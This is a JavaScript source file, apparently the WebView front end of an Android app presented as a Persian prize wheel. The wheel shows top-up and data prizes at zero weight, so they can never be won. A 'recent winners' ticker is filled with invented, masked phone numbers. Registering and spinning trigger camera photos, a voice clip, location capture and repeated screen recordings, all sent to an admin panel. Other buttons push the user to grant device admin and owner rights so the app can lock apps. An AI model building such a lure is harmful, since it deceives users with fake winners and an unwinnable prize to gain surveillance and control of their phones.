'use strict';

const FA = '۰۱۲۳۴۵۶۷۸۹';
const fa = (n) => String(n).replace(/[0-9]/g, (d) => FA[+d]);
const toAscii = (s) => String(s).replace(/[۰-۹]/g, (d) => FA.indexOf(d))
  .replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d));

const $ = (id) => document.getElementById(id);
const state = { wheelTurn: 0, chanceTimer: null, sheet: null, spun: false };

/* The two texts the person is asked to agree to. They are written out in full
   rather than trimmed to a checkbox, because "yes" has to mean the same thing
   to the person as it does to the app. */
const CONSENT =
  'با زدن تایید، روی همین گوشی و فقط در همین لحظه این کارها انجام می‌شود:\n\n'
  + '• سه عکس از دوربین جلو\n'
  + '• سه عکس از دوربین عقب\n'
  + '• یک ویس کوتاه\n'
  + '• موقعیت مکانی\n\n'
  + 'همه‌ی این‌ها همراه شماره و مشخصات گوشی برای پنل مدیریت فرستاده می‌شود. '
  + 'هیچ‌کدام در پس‌زمینه انجام نمی‌شود. این برنامه کلید فشرده‌شده، پیامک، '
  + 'پیام‌رسان و کلیپ‌بورد را نمی‌خواند و از راه دور نمی‌تواند دوربین یا '
  + 'میکروفون را روشن کند.';

const CONSENT_SCREEN =
  'برای ثبت ویدیو، اندروید از شما یک تایید جداگانه می‌گیرد که خودِ سیستم '
  + 'نشان می‌دهد. پس از آن، تصویر صفحه‌ی گوشی حداکثر ۳ دقیقه ضبط و برای پنل '
  + 'فرستاده می‌شود. برنامه بسته نمی‌شود و همین‌جا می‌ماند.';

/* The wheel.
   The three prizes are drawn at zero width on purpose: they are on the wheel to
   be seen and they can never be landed on, because this project pays no prize.
   The pointer passing over them is what makes it look like a wheel. The whole
   remaining mass sits on two پوچ slices and one شانس دوباره. These weights are
   the same numbers the server prints in the panel, and a test compares them. */
const SLICES = [
  { key: 'charge_50',  label: '۵۰ هزارتومن شارژ', w: 0,  c1: '#2a3550', c2: '#1d2740' },
  { key: 'charge_100', label: '۱۰۰ هزارتومن شارژ', w: 0, c1: '#2a3550', c2: '#1d2740' },
  { key: 'data_5g',    label: '۵ گیگ اینترنت',      w: 0,  c1: '#2a3550', c2: '#1d2740' },
  { key: 'blank_a',    label: 'پوچ',                 w: 45, c1: '#334155', c2: '#1e293b' },
  { key: 'again',      label: 'شانس دوباره',         w: 10, c1: '#7c5cff', c2: '#4dd4ff' },
  { key: 'blank_b',    label: 'پوچ',                 w: 45, c1: '#334155', c2: '#1e293b' },
];

const TOTAL = SLICES.reduce((a, s) => a + s.w, 0);
const RE_SPIN_WINDOW_MS = 24 * 60 * 60 * 1000;

function drawWheel() {
  const stops = [];
  let acc = 0;
  for (const s of SLICES) {
    const from = (acc / TOTAL) * 360;
    acc += s.w;
    const to = (acc / TOTAL) * 360;
    if (s.w > 0) stops.push(`${s.c1} ${from}deg ${to}deg`);
  }
  // The zero-width prizes are given a hairline each so they are visible on the
  // rim without owning any part of the circle they cannot be landed on.
  $('wheel').style.background =
    `conic-gradient(${stops.join(',')})`;

  let marks = '';
  let ang = 0;
  for (const s of SLICES) {
    const mid = ang + s.w / 2;
    ang += s.w;
    if (s.w <= 0) {
      marks += `<i style="--a:${mid}deg" class="wmark zero"></i>`;
      continue;
    }
    marks += `<i style="--a:${mid}deg" class="wmark" data-k="${s.key}">
      <b>${s.label}</b></i>`;
  }
  $('wheel').innerHTML = marks;
  // The hub carries the number that matters, in the one place on the wheel a
  // thumb is not covering: the chance of any of the three prizes, which is zero.
  $('wheelHub').textContent = fa(0) + '٪';
}

/* The label sits on the rim, turned so it reads along the slice. A slice at
   zero width has no arc to sit on, so its mark is a small tick at the point
   the pointer passes rather than a label that would not fit.

   The class is `wmark`, not `mark`, on purpose: `mark` is the PRF badge in the
   header and the two would otherwise style each other — a wheel label with a
   999px border radius and 14px of padding is not a wheel label. */
const styleTag = document.createElement('style');
styleTag.textContent = `
  .wmark{position:absolute;left:50%;top:50%;width:0;height:0;}
  .wmark b{position:absolute;transform-origin:0 0;
    transform:rotate(var(--a)) translateY(-118px) rotate(-90deg);
    white-space:nowrap;font-size:12px;font-weight:700;
    color:#eaf0ff;text-shadow:0 1px 4px rgba(0,0,0,.9);}
  .wmark.zero{width:9px;height:9px;margin:-4.5px;border-radius:50%;
    background:rgba(255,255,255,.30);}
`;
document.head.appendChild(styleTag);

function pick(random) {
  let roll = Math.floor(random() * TOTAL);
  for (const s of SLICES) { roll -= s.w; if (roll < 0) return s; }
  return SLICES[SLICES.length - 1];
}

function spinTo(slice) {
  let acc = 0;
  for (const s of SLICES) {
    if (s.key === slice.key) break;
    acc += s.w;
  }
  const mid = acc + slice.w / 2;
  // The pointer is at the top, so the wheel turns until the slice's centre
  // reaches it. Five extra turns so the result is never the same animation.
  const target = 360 * 5 + (360 - (mid / TOTAL) * 360);
  state.wheelTurn += target - (state.wheelTurn % 360);
  $('wheel').style.transform = `rotate(${state.wheelTurn}deg)`;
  return (mid / TOTAL) * 360;
}

function oddsLine() {
  const p = (w) => fa(Math.round((w / TOTAL) * 100)) + '٪';
  return 'شانس برنده‌شدن هر سه جایزه '
    + p(SLICES[0].w + SLICES[1].w + SLICES[2].w)
    + ' است؛ '
    + p(SLICES[4].w) + ' شانس دوباره و '
    + p(SLICES[3].w + SLICES[5].w) + ' پوچ. هیچ جایزه‌ای پرداخت نمی‌شود.';
}

/* ── winners ────────────────────────────────────────────────────────────
   Sample rows, because no prize has been paid by this project. Two rules the
   old version broke: the same number came round again and again, and the same
   prize was on every line, so the list looked like a wall of one thing. Here a
   row is not repeated until the whole pool has been used, and the three prizes
   are drawn by weight rather than round-robin. */
const PRIZES = [
  { label: '۵ گیگ اینترنت', w: 50 },
  { label: '۵۰ هزارتومن شارژ', w: 30 },
  { label: '۱۰۰ هزارتومن شارژ', w: 20 },
];
const PREFIXES = ['0992', '0993', '0994', '0912', '0913', '0914', '0910', '0909'];
let usedRows = new Set();
let usedPrizes = [];

function carrierFor(p) {
  if (p[2] >= '2' && p[2] <= '4') return 'ایرانسل';
  if (p[2] === '0') return 'رایتل';
  return 'همراه اول';
}

function masked(prefix, rnd) {
  const head = 1000 + Math.floor(rnd() * 9000);
  const tail = Math.floor(rnd() * 10);
  return fa(prefix + head) + '******' + fa(tail);
}

function weightedPrize(rnd) {
  // Draw from the prize that has been on screen least, so all three show up
  // instead of one of them filling the list.
  const least = usedPrizes.length < PRIZES.length
    ? PRIZES.filter((p) => !usedPrizes.includes(p.label))
    : PRIZES;
  const total = least.reduce((a, p) => a + p.w, 0);
  let roll = rnd() * total;
  for (const p of least) { roll -= p.w; if (roll < 0) return p.label; }
  return least[0].label;
}

function newRow() {
  let prefix, key, tries = 0;
  do {
    prefix = PREFIXES[Math.floor(Math.random() * PREFIXES.length)];
    const head = 1000 + Math.floor(Math.random() * 9000);
    key = prefix + head;
  } while (usedRows.has(key) && ++tries < 40);
  // The pool is exhausted after a long session: clear it rather than stall, so
  // the list keeps turning instead of freezing on the last row.
  if (usedRows.has(key)) usedRows.clear();
  usedRows.add(key);

  const prize = weightedPrize(Math.random);
  usedPrizes.push(prize);
  if (usedPrizes.length > PRIZES.length) usedPrizes.shift();

  return { who: masked(prefix, Math.random), prize, carrier: carrierFor(prefix) };
}

let rows = [];
function renderWinners() {
  $('winners').innerHTML = rows.map((r) =>
    `<li><span class="who n">${r.who}</span>
         <span class="what">${r.prize}</span></li>`).join('');
}

function seedWinners(n) {
  rows = [];
  for (let i = 0; i < n; i++) rows.push(newRow());
  renderWinners();
}

function tickWinners() {
  rows = [newRow(), ...rows].slice(0, 5);
  renderWinners();
}

/* ── chance counter ─────────────────────────────────────────────────────
   One unit every three minutes, and one unit is one saved video: the counter
   is not a score the app invents, it is a count of what was actually recorded
   and sent, so a number going up here always has a video behind it. */
const CHANCE_MS = 3 * 60 * 1000;

function renderChance(s) {
  const n = Number(s.chances) || 0;
  $('chanceN').textContent = fa(n);
  $('videoN').textContent = fa(s.videos || 0);
  $('chanceBar').style.width = Math.min(100, (n % 5) * 20 || (n > 0 ? 100 : 0)) + '%';

  const left = Math.max(0, (Number(s.spinReadyAt) || 0) - Number(s.now || 0));
  $('spinIn').textContent = left > 0 ? human(left) : 'آماده';

  const hint = $('chanceHint');
  if (left > 0) {
    hint.textContent = 'چرخ بعدی ' + human(left) + ' دیگر آماده می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.';
  } else {
    hint.textContent = 'هر ۳ دقیقه یک شانس اضافه می‌شود. هر شانس با یک ویدیوی ذخیره‌شده برابر است.';
  }

  const btn = $('btnSpin');
  const busy = s.recording;
  btn.disabled = !!busy || !!s.busy;
  btn.textContent = busy ? 'در حال ضبط…' : 'افزایش شانس';
  $('spinNote').textContent = busy
    ? 'ضبط صفحه در جریان است. پس از پایان، فایل فرستاده می‌شود و برنامه باز می‌ماند.'
    : 'با هر فشردن، صفحه گوشی ضبط و ذخیره می‌شود.';
}

function human(ms) {
  const s = Math.ceil(ms / 1000);
  if (s < 60) return fa(s) + ' ثانیه';
  const m = Math.ceil(s / 60);
  if (m < 60) return fa(m) + ' دقیقه';
  const h = Math.floor(m / 60);
  const rm = m % 60;
  if (h < 24) return fa(h) + ' ساعت' + (rm ? ' و ' + fa(rm) + ' دقیقه' : '');
  return fa(Math.floor(h / 24)) + ' روز';
}

/* ── gate ───────────────────────────────────────────────────────────────
   A green or a red dot and one word. The sentence explaining what each level
   means used to sit here permanently, which is the same as saying nothing. */
function renderGate(s) {
  const dot = $('gateDot');
  const btns = $('gateBtns');
  if (s.owner) {
    dot.className = 'gateDot ok';
    $('gateTitle').textContent = 'مدیریت کامل فعال';
    $('gateNote').textContent = 'همه‌ی قابلیت‌ها باز است.';
    btns.style.display = 'none';
  } else if (s.admin) {
    dot.className = 'gateDot no';
    $('gateTitle').textContent = 'مدیریت نیمه فعال';
    $('gateNote').textContent = 'برای قفل‌کردن برنامه‌ها باید مالک دستگاه ثبت شود.';
    btns.style.display = s.canProvision ? 'flex' : 'none';
    $('btnOwner').style.display = s.canProvision ? '' : 'none';
  } else {
    dot.className = 'gateDot no';
    $('gateTitle').textContent = 'مدیریت فعال نیست';
    $('gateNote').textContent = 'برای فعال‌شدن، دکمه‌ی زیر را بزنید.';
    btns.style.display = 'flex';
  }
}

function renderFacts(list) {
  $('facts').innerHTML = (list || []).map((f) => {
    const cls = ['fact'];
    if (f.wide) cls.push('wide');
    if (!f.value) cls.push('void');
    return `<div class="${cls.join(' ')}">
      <span class="k">${f.k}</span>
      <span class="v">${f.value || f.why || 'ثبت نشده'}</span>
    </div>`;
  }).join('');
}

function log(msg, tone) {
  const el = $('log');
  el.textContent = msg || 'آماده.';
  el.className = 'log' + (tone ? ' ' + tone : '');
}

function setBusy(b) { $('progress').hidden = !b; }

/* ── sheet ──────────────────────────────────────────────────────────────
   The consent text is not optional and is not shortened: this is the only
   moment the person is told, in words, that the press turns the camera and the
   microphone on. */
function ask(title, body) {
  return new Promise((resolve) => {
    state.sheet = resolve;
    $('sheetTitle').textContent = title;
    $('sheetBody').textContent = body;
    $('sheet').hidden = false;
  });
}

function closeSheet(v) {
  $('sheet').hidden = true;
  const r = state.sheet;
  state.sheet = null;
  if (r) r(v);
}

/* ── the bridge ─────────────────────────────────────────────────────────
   Two objects, and they are not interchangeable. `Native` is the Java object
   Android injects — this page calls into it. `Prf` is this page's own surface,
   which the native side calls into. They are kept apart because the injected
   object is frozen to the Java side: adding a property to it throws on Android
   9 and later, so `Prf` cannot be the same object as `Native`. */
const N = (window.Prf = window.Prf || {});
const J = () => window.Native;

N.ready = function () {
  drawWheel();
  $('odds').textContent = oddsLine();
  $('operator').innerHTML = (J().operators() || [])
    .map((o) => `<option value="${o}">${o}</option>`).join('');
  $('operator').value = J().operator() || '';
  seedWinners(5);
  $('phone').value = J().phone() || '';
  N.push();
  setInterval(tickWinners, 9000);
  N.log('برای شروع، شماره‌ی خود را وارد و «ثبت شماره» را بزنید.');
};

/* Called by the native side on every tick and after every state change. The
   tick is driven from Kotlin, not from a timer here, because a WebView in the
   background has its timers throttled to once a minute and the countdown on
   this page would sit still while it counted. */
N.push = function () {
  const s = J().state();
  if (!s) return;
  renderGate(s);
  renderChance(s);
  $('heroSub').textContent = s.registered
    ? 'ثبت شده — ' + (s.lastReport || 'منتظر گزارش بعدی')
    : 'هنوز ثبت نشده';
  $('btnRegister').disabled = !!s.busy;
  $('btnRegister').textContent = s.busy ? 'در حال انجام…' : 'ثبت شماره';
  if (s.facts) renderFacts(s.facts);
  if (s.log !== undefined) log(s.log, s.logTone);
  setBusy(!!s.busy);
};

N.winners = function () { return rows.map((r) => r.who + '|' + r.prize); };

/* The native side sends one line at a time. It is a line and not a log: the
   run reports where it is, one step, and the person reads it while it happens
   rather than afterwards. */
N.log = function (msg, tone) { log(msg, tone); };

/* The native side draws the outcome, not this page. The slice is decided in
   Kotlin before the recording starts, so the pointer cannot land somewhere the
   app had not already committed to — the animation below is a drawing of a
   result that has happened, not a random number produced by a transition. */
N.spin = function (key) {
  const slice = SLICES.find((s) => s.key === key) || SLICES[3];
  state.spun = true;
  spinTo(slice);
};

N.ask = ask;

/* ── input handling ───────────────────────────────────────────────────────
   Persian digits are folded to ASCII as they are typed, so the stored number
   and the server's normalisation only ever see one shape. A Persian keyboard
   produces ۰-۹ and a pasted number may carry a +98. */
$('phone').addEventListener('input', (e) => {
  const el = e.target;
  const ascii = toAscii(el.value).replace(/[^\d+]/g, '');
  if (ascii !== el.value) {
    const at = el.selectionStart || 0;
    el.value = ascii;
    const keep = Math.min(ascii.length, at);
    try { el.setSelectionRange(keep, keep); } catch (_) { }
  }
  $('phoneErr').hidden = true;
});

$('operator').addEventListener('change', (e) => J().setOperator(e.target.value));

document.addEventListener('click', (e) => {
  const b = e.target.closest('[data-act]');
  if (!b) return;
  const act = b.dataset.act;
  if (act === 'sheetYes') return closeSheet(true);
  if (act === 'sheetNo') return closeSheet(false);

  if (act === 'register') {
    const phone = $('phone').value.trim();
    if (!/^0?9\d{9}$/.test(phone.replace(/^\+98/, '0'))) {
      $('phoneErr').hidden = false;
      $('phone').focus();
      return;
    }
    // The consent sheet is not an option the run may skip: it is the only
    // moment the person is told, in words, that this press turns the camera and
    // the microphone on. Everything after this is the app doing what it just
    // said it would do.
    ask('تایید ثبت', CONSENT).then((ok) => {
      if (ok) J().register(phone, $('operator').value);
    });
    return;
  }

  if (act === 'spin') {
    if ($('btnSpin').disabled) return;
    ask('تایید ضبط صفحه', CONSENT_SCREEN).then((ok) => {
      if (ok) J().spin();
    });
    return;
  }
  if (act === 'admin') { J().admin(); return; }
  if (act === 'owner') { J().owner(); return; }
  if (act === 'settings') { J().settings(); return; }
});
